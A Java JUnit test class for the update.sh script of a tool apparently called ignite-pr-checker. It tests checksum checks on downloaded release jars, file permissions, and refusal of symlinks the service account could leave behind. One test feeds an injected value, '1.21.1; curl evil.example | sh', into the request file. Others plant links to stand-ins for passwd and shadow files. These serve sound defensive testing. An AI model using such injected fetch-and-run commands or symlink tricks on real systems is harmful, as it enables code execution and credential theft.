package com.github.igniteprchecker.update;

import static java.nio.charset.StandardCharsets.UTF_8;
import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.within;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.when;

import com.github.igniteprchecker.InstallScript;
import com.github.igniteprchecker.config.UpdateProperties;
import com.github.igniteprchecker.github.GithubClient;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.attribute.PosixFilePermission;
import java.security.MessageDigest;
import java.util.HexFormat;
import java.util.List;
import java.util.Properties;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;
import org.springframework.beans.factory.ObjectProvider;
import org.springframework.boot.info.BuildProperties;

/**
 * Asked to update to the release the page offered, run.sh fetched /releases/latest instead, took the download for a
 * jar if it was over a megabyte and began with "PK", and on any failure kept the old jar without a word: the page
 * came back on the old version as if nothing had been asked. Runs install.sh's update.sh in a scratch directory with
 * a curl that serves releases from files.
 */
class UpdateScriptTest {
    private static final String OLD = "jar of v1.21.0";

    @TempDir
    Path app;

    @TempDir
    Path stubs;

    private Path script;

    @BeforeEach
    void setUp() throws Exception {
        script = InstallScript.updateSh(app);
        Files.createDirectories(app.resolve("update"));
        Files.writeString(app.resolve("app.jar"), OLD);

        stub("curl", """
            out=""; url=""
            while [ $# -gt 0 ]; do
                case "$1" in
                    -o) out="$2"; shift 2 ;;
                    -m|-H) shift 2 ;;
                    -*) shift ;;
                    *) url="$1"; shift ;;
                esac
            done
            echo "$url" >> "STUBS/curl-log"
            case "$url" in
                */releases/tags/*) f="STUBS/release-${url##*/}.json"; [ -f "$f" ] && cat "$f" && exit 0 ;;
                */releases/download/*) v="${url%/*}"; f="STUBS/jar-${v##*/}"; [ -f "$f" ] && cp "$f" "$out" && exit 0 ;;
            esac
            exit 22
            """.replace("STUBS", stubs.toString()));
        if (new ProcessBuilder("bash", "-c", "command -v sha256sum").start().waitFor() != 0)
            stub("sha256sum", "exec shasum -a 256 \"$@\"");
    }

    private void stub(String name, String body) throws IOException {
        Path f = stubs.resolve(name);
        Files.writeString(f, "#!/usr/bin/env bash\n" + body);
        f.toFile().setExecutable(true);
    }

    /**
     * A release as GitHub describes it: a checksum file listed before the jar, the uploader object between the jar's
     * name and its digest, and release notes that mention the jar.
     */
    private void release(String version, String jar, String digest) throws Exception {
        Files.writeString(stubs.resolve("jar-v" + version), jar);
        Files.writeString(stubs.resolve("release-v" + version + ".json"), """
            {
              "url": "https://api.github.com/repos/anton-vinogradov/ignite-pr-checker/releases/250000001",
              "tag_name": "vVERSION",
              "name": "vVERSION",
              "assets": [
                {
                  "id": 300000000,
                  "name": "ignite-pr-checker.jar.sha256",
                  "uploader": { "login": "github-actions[bot]", "id": 41898282, "type": "Bot" },
                  "size": 64,
                  "digest": "sha256:1111111111111111111111111111111111111111111111111111111111111111"
                },
                {
                  "id": 300000001,
                  "name": "ignite-pr-checker.jar",
                  "label": null,
                  "uploader": { "login": "github-actions[bot]", "id": 41898282, "type": "Bot", "site_admin": false },
                  "content_type": "application/java-archive",
                  "size": 14,
                  "digest": DIGEST,
                  "browser_download_url": "https://github.com/anton-vinogradov/ignite-pr-checker/releases/download/vVERSION/ignite-pr-checker.jar"
                }
              ],
              "body": "## What changes for users\\n- {\\"name\\": \\"ignite-pr-checker.jar\\"} is smaller"
            }
            """.replace("VERSION", version).replace("DIGEST", digest == null ? "null" : "\"sha256:" + digest + "\""));
    }

    private static String sha256(String content) throws Exception {
        return HexFormat.of().formatHex(MessageDigest.getInstance("SHA-256").digest(content.getBytes(UTF_8)));
    }

    private int run(String... args) throws Exception {
        return runWithUmask("022", args);
    }

    private int runWithUmask(String umask, String... args) throws Exception {
        String[] cmd = new String[args.length + 4];
        cmd[0] = "bash";
        cmd[1] = "-c";
        cmd[2] = "umask " + umask + "; exec bash \"$0\" \"$@\"";
        cmd[3] = script.toString();
        System.arraycopy(args, 0, cmd, 4, args.length);
        ProcessBuilder pb = new ProcessBuilder(cmd).redirectErrorStream(true);
        pb.environment().put("PATH", stubs + ":" + pb.environment().get("PATH"));
        Process p = pb.start();
        p.getInputStream().readAllBytes();

        return p.waitFor();
    }

    private List<String> asked() throws IOException {
        Path log = stubs.resolve("curl-log");

        return Files.exists(log) ? Files.readAllLines(log) : List.of();
    }

    private String failed() throws IOException {
        return Files.readString(app.resolve("update-failed"));
    }

    @Test
    void theRequestedReleaseIsInstalledAndTheOldJarKept() throws Exception {
        release("1.21.1", "jar of v1.21.1", sha256("jar of v1.21.1"));
        Files.writeString(app.resolve("update/requested"), "1.21.1");
        Files.writeString(app.resolve("update-failed"), "1.21.1\t2026-10-07T10:00:00Z\tGitHub did not describe it");

        assertThat(run()).isZero();

        assertThat(app.resolve("app.jar")).hasContent("jar of v1.21.1");
        assertThat(app.resolve("app.jar.prev")).hasContent(OLD);
        assertThat(app.resolve("update/requested")).doesNotExist();
        assertThat(app.resolve("update-failed")).doesNotExist();
        assertThat(app.resolve("app.jar.new")).doesNotExist();
        assertThat(asked()).containsExactly(
            "https://api.github.com/repos/anton-vinogradov/ignite-pr-checker/releases/tags/v1.21.1",
            "https://github.com/anton-vinogradov/ignite-pr-checker/releases/download/v1.21.1/ignite-pr-checker.jar");
    }

    @Test
    void aDownloadThatIsNotTheReleasesJarIsNotInstalled() throws Exception {
        release("1.21.1", "half a jar", sha256("jar of v1.21.1"));
        Files.writeString(app.resolve("update/requested"), "1.21.1\n");

        assertThat(run()).as("never fails the start").isZero();

        assertThat(app.resolve("app.jar")).hasContent(OLD);
        assertThat(app.resolve("app.jar.new")).doesNotExist();
        assertThat(app.resolve("update/requested")).doesNotExist();
        assertThat(failed()).matches("1\\.21\\.1\t\\d{4}-\\d\\d-\\d\\dT\\d\\d:\\d\\d:\\d\\dZ\tthe download's sha256 "
            + sha256("half a jar") + " is not the release's " + sha256("jar of v1.21.1") + "\n");
    }

    @Test
    void aReleaseWithoutAChecksumIsNotInstalled() throws Exception {
        release("1.21.1", "jar of v1.21.1", null);
        Files.writeString(app.resolve("update/requested"), "1.21.1");

        assertThat(run()).isZero();

        assertThat(app.resolve("app.jar")).hasContent(OLD);
        assertThat(failed()).endsWith("\trelease v1.21.1 lists no sha256 for ignite-pr-checker.jar\n");
    }

    /** update/ belongs to the service account; update.sh runs as root. */
    @Test
    void aRequestIsReadOnlyFromAPlainFileAndNeverRepeated() throws Exception {
        release("1.21.1", "jar of v1.21.1", sha256("jar of v1.21.1"));
        Files.writeString(app.resolve("secret"), "1.21.1");
        Files.createSymbolicLink(app.resolve("update/requested"), app.resolve("secret"));

        assertThat(run()).isZero();
        assertThat(asked()).isEmpty();
        assertThat(app.resolve("app.jar")).hasContent(OLD);

        Files.delete(app.resolve("update/requested"));
        Files.writeString(app.resolve("update/requested"), "1.21.1; curl evil.example | sh");

        assertThat(run()).isZero();
        assertThat(asked()).isEmpty();
        assertThat(failed()).startsWith("?\t").endsWith("\tthe request does not name a release\n")
            .doesNotContain("evil");
    }

    @Test
    void withoutARequestNothingHappens() throws Exception {
        assertThat(run()).isZero();

        assertThat(asked()).isEmpty();
        assertThat(app.resolve("app.jar")).hasContent(OLD);
        assertThat(app.resolve("update-failed")).doesNotExist();
    }

    /**
     * The old install's directory was the service account's, and the app.jar.new it left, a link into cache/ or a file
     * of its own, was downloaded into: app.jar became that link or that file and stayed the service account's to
     * rewrite.
     */
    @Test
    void theJarLandsInANewFileNotInOneTheServiceAccountLeft() throws Exception {
        Path held = Files.createDirectories(app.resolve("cache")).resolve("held.jar");
        Files.writeString(held, "held by prc");
        Files.createSymbolicLink(app.resolve("app.jar.new"), held);
        release("1.21.1", "jar of v1.21.1", sha256("jar of v1.21.1"));

        assertThat(run("1.21.1")).isZero();

        assertThat(Files.isSymbolicLink(app.resolve("app.jar"))).isFalse();
        assertThat(app.resolve("app.jar")).hasContent("jar of v1.21.1");
        assertThat(held).hasContent("held by prc");

        Files.writeString(app.resolve("app.jar.new"), "left by the old run.sh");
        Object leftover = Files.getAttribute(app.resolve("app.jar.new"), "unix:ino");
        release("1.21.2", "jar of v1.21.2", sha256("jar of v1.21.2"));

        assertThat(run("1.21.2")).isZero();

        assertThat(app.resolve("app.jar")).hasContent("jar of v1.21.2");
        assertThat(Files.getAttribute(app.resolve("app.jar"), "unix:ino")).isNotEqualTo(leftover);
    }

    /**
     * Links the old install's service account could leave where update.sh, run as root, writes or reads: the failure
     * was written through update-failed into the file it named, and the file app.jar named was copied into
     * app.jar.prev, readable by every account.
     */
    @Test
    void linksTheServiceAccountLeftAreNotFollowed() throws Exception {
        Path passwd = Files.writeString(stubs.resolve("passwd"), "root:x:0:0:root:/root:/bin/bash\n");
        Files.createSymbolicLink(app.resolve("update-failed"), passwd);

        assertThat(run("1.21.1")).isNotZero();

        assertThat(passwd).hasContent("root:x:0:0:root:/root:/bin/bash\n");
        assertThat(Files.isSymbolicLink(app.resolve("update-failed"))).isFalse();
        assertThat(failed()).endsWith("\tGitHub did not describe release v1.21.1\n");

        Path shadow = Files.writeString(stubs.resolve("shadow"), "root:$6$secret");
        Files.delete(app.resolve("app.jar"));
        Files.createSymbolicLink(app.resolve("app.jar"), shadow);
        release("1.21.1", "jar of v1.21.1", sha256("jar of v1.21.1"));

        assertThat(run("1.21.1")).isZero();

        assertThat(app.resolve("app.jar")).hasContent("jar of v1.21.1");
        assertThat(app.resolve("app.jar.prev")).doesNotExist();
        assertThat(shadow).hasContent("root:$6$secret");
    }

    /**
     * install.sh runs update.sh with root's own umask: at 077 the jar it installed was root's alone, and the service,
     * which runs as prc, could not read it and was restarted for ever.
     */
    @Test
    void theServiceCanReadTheJarWhateverRootsUmask() throws Exception {
        release("1.21.1", "jar of v1.21.1", sha256("jar of v1.21.1"));

        assertThat(runWithUmask("077", "1.21.1")).isZero();

        assertThat(Files.getPosixFilePermissions(app.resolve("app.jar"))).contains(PosixFilePermission.OTHERS_READ);
        assertThat(Files.getPosixFilePermissions(app.resolve("app.jar.prev")))
            .contains(PosixFilePermission.OTHERS_READ);
    }

    /** install.sh installs the latest release on each run: run again, it made that release the one to roll back to. */
    @Test
    void theSameReleaseInstalledAgainKeepsTheJarBeforeIt() throws Exception {
        release("1.21.1", "jar of v1.21.1", sha256("jar of v1.21.1"));

        assertThat(run("1.21.1")).isZero();
        assertThat(run("1.21.1")).isZero();

        assertThat(app.resolve("app.jar")).hasContent("jar of v1.21.1");
        assertThat(app.resolve("app.jar.prev")).hasContent(OLD);
    }

    /** install.sh installs a release through update.sh and must stop when it cannot. */
    @Test
    void aReleaseNamedOnTheCommandLineThatFailsFailsTheCommand() throws Exception {
        assertThat(run("1.21.1")).isNotZero();
        assertThat(app.resolve("app.jar")).hasContent(OLD);

        release("1.21.1", "jar of v1.21.1", sha256("jar of v1.21.1"));
        assertThat(run("v1.21.1")).isZero();
        assertThat(app.resolve("app.jar")).hasContent("jar of v1.21.1");
    }

    /** The page reads what update.sh did about the release the service asked for. */
    @Test
    @SuppressWarnings("unchecked")
    void thePageLearnsWhyTheUpdateDidNotHappen() throws Exception {
        GithubClient github = mock(GithubClient.class);
        when(github.latestReleaseTag()).thenReturn("1.21.1");
        Properties info = new Properties();
        info.setProperty("version", "1.21.0");
        ObjectProvider<BuildProperties> build = mock(ObjectProvider.class);
        when(build.getIfAvailable()).thenReturn(new BuildProperties(info));
        UpdateService update = new UpdateService(new UpdateProperties(true, app.resolve("app.jar").toString()),
            github, build, code -> { });
        release("1.21.1", "half a jar", sha256("jar of v1.21.1"));

        update.performUpdate();
        assertThat(app.resolve("update/requested")).hasContent("1.21.1");
        run();

        UpdateService.Failure failure = update.status().updateFailed();
        assertThat(failure.version()).isEqualTo("1.21.1");
        assertThat(failure.reason()).startsWith("the download's sha256 ");
        assertThat(failure.at()).isCloseTo(System.currentTimeMillis(), within(60_000L));
    }
}
